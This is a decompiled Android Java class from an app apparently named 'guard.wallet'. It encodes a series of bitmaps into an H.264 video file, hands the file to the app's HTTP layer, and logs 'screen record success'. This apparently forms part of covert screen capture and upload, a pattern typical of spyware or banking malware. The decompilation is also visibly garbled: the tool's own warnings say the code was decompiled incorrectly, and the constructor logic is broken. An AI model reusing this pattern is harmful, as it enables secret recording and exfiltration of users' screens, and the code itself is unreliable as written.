package com.guard.wallet.thread;

import a1.AbstractC0026q;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.graphics.Rect;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaCodecList;
import android.media.MediaCrypto;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.util.Log;
import android.view.Surface;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.utils.AbstractC0251g;
import java.io.File;
import java.nio.ByteBuffer;
import java.util.LinkedList;
import java.util.concurrent.Callable;

/* renamed from: com.guard.wallet.thread.i */
/* loaded from: classes.dex */
public final class CallableC0240i implements Callable {

    /* renamed from: a */
    public final Bitmap[] f380a;

    /* renamed from: b */
    public final String f381b;

    /* renamed from: c */
    public final MediaFormat f382c;

    /* renamed from: d */
    public final MediaMuxer f383d;

    /* renamed from: e */
    public final MediaCodec f384e;

    /* JADX WARN: Can't wrap try/catch for region: R(11:0|1|(9:32|33|4|5|6|(1:(3:8|(2:10|11)(3:13|(2:15|(2:18|19)(1:17))|27)|12)(2:28|29))|(2:21|22)|24|25)|3|4|5|6|(2:(0)(0)|12)|(0)|24|25) */
    /* JADX WARN: Code restructure failed: missing block: B:30:0x0060, code lost:
    
        r9 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:31:0x0061, code lost:
    
        a1.AbstractC0026q.m186s("com.guard.wallet.thread.i", r9);
     */
    /* JADX WARN: Removed duplicated region for block: B:21:0x0050 A[Catch: Exception -> 0x0060, TRY_LEAVE, TryCatch #0 {Exception -> 0x0060, blocks: (B:6:0x0022, B:8:0x002b, B:12:0x004a, B:13:0x0036, B:15:0x003e, B:21:0x0050, B:17:0x0047), top: B:5:0x0022 }] */
    /* JADX WARN: Removed duplicated region for block: B:28:0x004d A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:8:0x002b A[Catch: Exception -> 0x0060, TryCatch #0 {Exception -> 0x0060, blocks: (B:6:0x0022, B:8:0x002b, B:12:0x004a, B:13:0x0036, B:15:0x003e, B:21:0x0050, B:17:0x0047), top: B:5:0x0022 }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public CallableC0240i(Bitmap[] bitmapArr, String str, MediaFormat mediaFormat) {
        MediaMuxer mediaMuxer;
        int codecCount;
        int i2;
        MediaCodecInfo mediaCodecInfo;
        this.f380a = bitmapArr;
        this.f381b = str;
        this.f382c = mediaFormat;
        MediaCodec mediaCodec = null;
        if (!AbstractC0026q.m151B(str)) {
            try {
                mediaMuxer = new MediaMuxer(str, 0);
            } catch (Exception e2) {
                AbstractC0026q.m186s("com.guard.wallet.thread.i", e2);
            }
            this.f383d = mediaMuxer;
            codecCount = MediaCodecList.getCodecCount();
            i2 = 0;
            loop0: while (true) {
                if (i2 < codecCount) {
                    mediaCodecInfo = null;
                    break;
                }
                mediaCodecInfo = MediaCodecList.getCodecInfoAt(i2);
                if (mediaCodecInfo.isEncoder()) {
                    for (String str2 : mediaCodecInfo.getSupportedTypes()) {
                        if (str2.equalsIgnoreCase("video/avc")) {
                            break loop0;
                        }
                    }
                }
                i2++;
            }
            if (mediaCodecInfo != null) {
                MediaCodec createByCodecName = MediaCodec.createByCodecName(mediaCodecInfo.getName());
                createByCodecName.configure(this.f382c, (Surface) null, (MediaCrypto) null, 1);
                mediaCodec = createByCodecName;
            }
            this.f384e = mediaCodec;
        }
        mediaMuxer = null;
        this.f383d = mediaMuxer;
        codecCount = MediaCodecList.getCodecCount();
        i2 = 0;
        loop0: while (true) {
            if (i2 < codecCount) {
            }
            i2++;
        }
        if (mediaCodecInfo != null) {
        }
        this.f384e = mediaCodec;
    }

    @Override // java.util.concurrent.Callable
    public final Object call() {
        MediaCodec mediaCodec;
        Bitmap[] bitmapArr;
        MediaFormat mediaFormat;
        Bitmap bitmap;
        Surface surface;
        int i2;
        int i3;
        MediaCodec.BufferInfo bufferInfo;
        int dequeueOutputBuffer;
        ByteBuffer outputBuffer;
        MediaFormat mediaFormat2 = this.f382c;
        MediaMuxer mediaMuxer = this.f383d;
        if (mediaMuxer != null && (mediaCodec = this.f384e) != null && (bitmapArr = this.f380a) != null && bitmapArr.length != 0) {
            long currentTimeMillis = System.currentTimeMillis() / 1000;
            Surface createInputSurface = mediaCodec.createInputSurface();
            mediaCodec.start();
            int addTrack = mediaMuxer.addTrack(mediaCodec.getOutputFormat());
            int length = bitmapArr.length;
            int i4 = addTrack;
            int i5 = 0;
            int i6 = 0;
            while (i5 < length) {
                Bitmap bitmap2 = bitmapArr[i5];
                if (bitmap2 != null) {
                    try {
                        Bitmap m678y = AbstractC0251g.m678y(bitmap2);
                        i2 = length;
                        try {
                            i3 = i4;
                            try {
                                mediaFormat = mediaFormat2;
                                try {
                                    Rect rect = new Rect(0, 0, mediaFormat2.getInteger("width"), mediaFormat2.getInteger("height"));
                                    try {
                                        Canvas lockCanvas = createInputSurface.lockCanvas(rect);
                                        lockCanvas.drawBitmap(m678y, (Rect) null, rect, (Paint) null);
                                        createInputSurface.unlockCanvasAndPost(lockCanvas);
                                        AbstractC0251g.J0(m678y);
                                        bufferInfo = new MediaCodec.BufferInfo();
                                    } catch (Exception e2) {
                                        e = e2;
                                        bitmap = bitmap2;
                                        surface = createInputSurface;
                                        i4 = i3;
                                        AbstractC0026q.m186s("com.guard.wallet.thread.i", e);
                                        AbstractC0251g.J0(bitmap);
                                        i6++;
                                        i5++;
                                        createInputSurface = surface;
                                        length = i2;
                                        mediaFormat2 = mediaFormat;
                                    }
                                    try {
                                        dequeueOutputBuffer = mediaCodec.dequeueOutputBuffer(bufferInfo, 1000L);
                                    } catch (Exception e3) {
                                        e = e3;
                                        bitmap = bitmap2;
                                        surface = createInputSurface;
                                        i4 = i3;
                                        AbstractC0026q.m186s("com.guard.wallet.thread.i", e);
                                        AbstractC0251g.J0(bitmap);
                                        i6++;
                                        i5++;
                                        createInputSurface = surface;
                                        length = i2;
                                        mediaFormat2 = mediaFormat;
                                    }
                                } catch (Exception e4) {
                                    e = e4;
                                    bitmap = bitmap2;
                                    surface = createInputSurface;
                                }
                            } catch (Exception e5) {
                                e = e5;
                                mediaFormat = mediaFormat2;
                            }
                        } catch (Exception e6) {
                            e = e6;
                            mediaFormat = mediaFormat2;
                            bitmap = bitmap2;
                            surface = createInputSurface;
                            i3 = i4;
                            i4 = i3;
                            AbstractC0026q.m186s("com.guard.wallet.thread.i", e);
                            AbstractC0251g.J0(bitmap);
                            i6++;
                            i5++;
                            createInputSurface = surface;
                            length = i2;
                            mediaFormat2 = mediaFormat;
                        }
                    } catch (Exception e7) {
                        e = e7;
                        mediaFormat = mediaFormat2;
                        bitmap = bitmap2;
                        surface = createInputSurface;
                        i2 = length;
                    }
                    if (dequeueOutputBuffer == -1) {
                        i4 = i3;
                    } else {
                        if (dequeueOutputBuffer == -2) {
                            try {
                                i4 = mediaMuxer.addTrack(mediaCodec.getOutputFormat());
                                try {
                                    mediaMuxer.start();
                                } catch (Exception e8) {
                                    e = e8;
                                    bitmap = bitmap2;
                                    surface = createInputSurface;
                                    AbstractC0026q.m186s("com.guard.wallet.thread.i", e);
                                    AbstractC0251g.J0(bitmap);
                                    i6++;
                                    i5++;
                                    createInputSurface = surface;
                                    length = i2;
                                    mediaFormat2 = mediaFormat;
                                }
                            } catch (Exception e9) {
                                e = e9;
                                bitmap = bitmap2;
                                surface = createInputSurface;
                                i4 = i3;
                            }
                        } else {
                            i4 = i3;
                        }
                        if (dequeueOutputBuffer >= 0 && (outputBuffer = mediaCodec.getOutputBuffer(dequeueOutputBuffer)) != null) {
                            bitmap = bitmap2;
                            if (bufferInfo.size != 0) {
                                surface = createInputSurface;
                                try {
                                    bufferInfo.presentationTimeUs = (i6 + currentTimeMillis) * 200 * 1000;
                                    if (i6 == bitmapArr.length - 1) {
                                        bufferInfo.flags = 4;
                                    } else {
                                        bufferInfo.flags = 1;
                                    }
                                    if (i4 >= 0) {
                                        mediaMuxer.writeSampleData(i4, outputBuffer, bufferInfo);
                                    }
                                } catch (Exception e10) {
                                    e = e10;
                                    AbstractC0026q.m186s("com.guard.wallet.thread.i", e);
                                    AbstractC0251g.J0(bitmap);
                                    i6++;
                                    i5++;
                                    createInputSurface = surface;
                                    length = i2;
                                    mediaFormat2 = mediaFormat;
                                }
                            } else {
                                surface = createInputSurface;
                            }
                            try {
                                mediaCodec.releaseOutputBuffer(dequeueOutputBuffer, false);
                            } catch (Exception e11) {
                                e = e11;
                                AbstractC0026q.m186s("com.guard.wallet.thread.i", e);
                                AbstractC0251g.J0(bitmap);
                                i6++;
                                i5++;
                                createInputSurface = surface;
                                length = i2;
                                mediaFormat2 = mediaFormat;
                            }
                            AbstractC0251g.J0(bitmap);
                        }
                    }
                    surface = createInputSurface;
                    i5++;
                    createInputSurface = surface;
                    length = i2;
                    mediaFormat2 = mediaFormat;
                } else {
                    mediaFormat = mediaFormat2;
                    surface = createInputSurface;
                    i2 = length;
                }
                i6++;
                i5++;
                createInputSurface = surface;
                length = i2;
                mediaFormat2 = mediaFormat;
            }
            try {
                mediaCodec.stop();
                mediaCodec.release();
                mediaMuxer.stop();
                mediaMuxer.release();
                String str = this.f381b;
                if (!AbstractC0026q.m151B(str)) {
                    File file = new File(str);
                    if (file.exists()) {
                        LinkedList linkedList = new LinkedList();
                        linkedList.add(file);
                        AbstractC0207l.m417E(linkedList);
                    }
                }
                Log.d("com.guard.wallet.thread.i", "screen record success...");
            } catch (Exception e12) {
                AbstractC0026q.m186s("com.guard.wallet.thread.i", e12);
            }
        }
        return Boolean.TRUE;
    }
}
